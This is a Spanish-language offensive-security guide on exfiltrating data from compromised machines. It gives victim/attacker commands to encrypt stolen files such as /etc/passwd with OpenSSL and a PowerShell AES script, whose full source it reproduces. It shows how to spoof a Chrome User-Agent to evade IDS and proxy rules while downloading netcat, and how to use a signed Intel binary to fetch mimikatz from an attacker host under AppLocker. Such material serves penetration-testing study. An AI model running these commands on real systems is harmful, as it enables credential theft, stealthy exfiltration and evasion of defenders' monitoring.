---
title: "Transferencias Cifradas y Técnicas de Evasión"
pubDate: '2026-08-26'
---

Guía para proteger datos sensibles durante la exfiltración mediante cifrado local (OpenSSL, AES-256) y técnicas de evasión de controles perimetrales, suplantación de User-Agent y LOLBAS.

---

## 🔐 1. Cifrado de Archivos en Tránsito

Cuando no se cuenta con canales inherentemente seguros (SSH, SFTP, HTTPS) y se deben transferir datos altamente confidenciales (ej. `NTDS.dit`, credenciales o volcados de memoria), es obligatorio **cifrar el archivo localmente antes de enviarlo**.

### Cifrado en Linux con OpenSSL (AES-256-CBC con PBKDF2)
```bash
# 1. VÍCTIMA: Cifrar el archivo con contraseña
openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc

# 2. ATACANTE: Descifrar el archivo tras exfiltrarlo
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
```

### Cifrado en Windows con PowerShell (`Invoke-AESEncryption.ps1`)
```powershell
# 1. Importar módulo en la sesión
Import-Module .\Invoke-AESEncryption.ps1

# 2. Cifrar un archivo (genera archivo .aes)
Invoke-AESEncryption -Mode Encrypt -Key "P@ssw0rd123!" -Path .\scan-results.txt

# 3. Descifrar el archivo .aes
Invoke-AESEncryption -Mode Decrypt -Key "P@ssw0rd123!" -Path .\scan-results.txt.aes

# 4. Cifrar / Descifrar cadenas de texto en Base64
Invoke-AESEncryption -Mode Encrypt -Key "P@ssw0rd123!" -Text "Confidential String"
Invoke-AESEncryption -Mode Decrypt -Key "P@ssw0rd123!" -Text "<CADENA_ENCRIPTADA_BASE64>"
```

---

## 🕵️ 2. Evasión de Detección: Suplantación de User-Agent

Muchos sistemas de detección de intrusos (IDS) o proxies corporativos bloquean o alertan peticiones cuyo `User-Agent` corresponde al de PowerShell por defecto.

### Listar Perfiles de User-Agent Disponibles en PowerShell:
```powershell
[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name, @{label="User Agent"; Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | Format-List
```

### Descarga Suplantando a Google Chrome:
```powershell
# Asignar cabecera de navegador legítimo
$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome

# Descargar payload eludiendo reglas de filtrado
Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```

---

## 🛡️ 3. Evasión mediante LOLBAS / GTFOBins (Living Off The Land)

En entornos con **Application Whitelisting** (AppLocker, WDAC) donde el uso de PowerShell, cURL o Wget está restringido, se abusan de binarios legítimos y firmados del propio sistema operativo (**LOLBINs**):

### Ejemplo en Windows: `GfxDownloadWrapper.exe`
Binario legítimo firmado por Intel presente en muchas instalaciones de Windows 10 para telemetría:
```cmd
GfxDownloadWrapper.exe "http://10.10.10.32/mimikatz.exe" "C:\Temp\nc.exe"
```

### Catálogos Comunitarios de Referencia:
* **LOLBAS Project (Windows):** [https://lolbas-project.github.io/](https://lolbas-project.github.io/) (Binarios, scripts y librerías de Windows para transferencias, bypass y ejecución).
* **GTFOBins (Linux/Unix):** [https://gtfobins.github.io/](https://gtfobins.github.io/) (Binarios de Linux para escalada de privilegios y descargas sin utilidades estándar).

---

## 📜 Anexo: Código Fuente de `Invoke-AESEncryption.ps1`

```powershell
function Invoke-AESEncryption {
    [CmdletBinding()]
    [OutputType([string])]
    Param
    (
        [Parameter(Mandatory = $true)]
        [ValidateSet('Encrypt', 'Decrypt')]
        [String]$Mode,

        [Parameter(Mandatory = $true)]
        [String]$Key,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
        [String]$Text,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
        [String]$Path
    )

    Begin {
        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
        $aesManaged = New-Object System.Security.Cryptography.AesManaged
        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        $aesManaged.BlockSize = 128
        $aesManaged.KeySize = 256
    }

    Process {
        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))

        switch ($Mode) {
            'Encrypt' {
                if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName + ".aes"
                }

                $encryptor = $aesManaged.CreateEncryptor()
                $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
                $encryptedBytes = $aesManaged.IV + $encryptedBytes
                $aesManaged.Dispose()

                if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File encrypted to $outPath"
                }
            }

            'Decrypt' {
                if ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)}
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName -replace ".aes"
                }

                $aesManaged.IV = $cipherBytes[0..15]
                $decryptor = $aesManaged.CreateDecryptor()
                $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
                $aesManaged.Dispose()

                if ($Text) {return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File decrypted to $outPath"
                }
            }
        }
    }

    End {
        $shaManaged.Dispose()
        $aesManaged.Dispose()
    }
}
```
